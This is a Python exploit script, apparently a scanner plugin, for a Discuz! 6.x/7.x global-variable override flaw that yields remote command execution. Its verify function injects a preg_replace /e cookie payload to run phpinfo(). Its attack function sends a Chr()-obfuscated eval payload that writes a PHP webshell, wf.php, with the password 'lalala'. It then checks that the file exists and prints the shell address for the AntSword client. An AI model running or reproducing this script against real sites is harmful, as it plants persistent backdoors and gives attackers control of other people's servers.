import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'Discuz!6.x7.x全局变量防御绕过-命令执行',
        'vulnerable': False,
        'attack': True,
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    cookies = {
        "GLOBALS[_DCACHE][smilies][searcharray]": "/.*/eui",
        "GLOBALS[_DCACHE][smilies][replacearray]": "phpinfo()",
    }
    try:
        tid = 1         # 默认页数
        vurl = urllib.parse.urljoin(url, '/viewthread.php?tid={0}'.format(tid))
        rep = requests.get(vurl, headers=headers, timeout=3)

        if re.search('discuz', rep.text):
            rep2 = requests.get(vurl, headers=headers, cookies=cookies, timeout=3)
            if re.search('PHP Version', rep2.text):
                relsult['vulnerable'] = True
                relsult['url'] = url
                relsult['vurl'] = vurl
                relsult['about'] = 'https://blog.csdn.net/haha13l4/article/details/95949416'
        return relsult
    except:
        return relsult


def attack(url):
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        }
        cookies = {
            "GLOBALS[_DCACHE][smilies][searcharray]": "/.*/eui",
            "GLOBALS[_DCACHE][smilies][replacearray]": "eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))",
        }
        relsult = verify(url)
        if relsult['vulnerable']:
            vurl = relsult['vurl']
            print('[+] 正在写入木马 ......')
            rep2 = requests.get(vurl, headers=headers, cookies=cookies, timeout=5)
            webshell = urllib.parse.urljoin(url, 'wf.php')
            verify_rep = requests.get(webshell, timeout=5)
            if rep2.status_code == 200 and verify_rep.status_code == 200:
                print('[+] 文件写入成功!')
                print('[*] webshell地址(蚁剑): ', webshell)
                print('[*] 密码: lalala')
                return True
            return False
        else:
            return False
    except:
        return False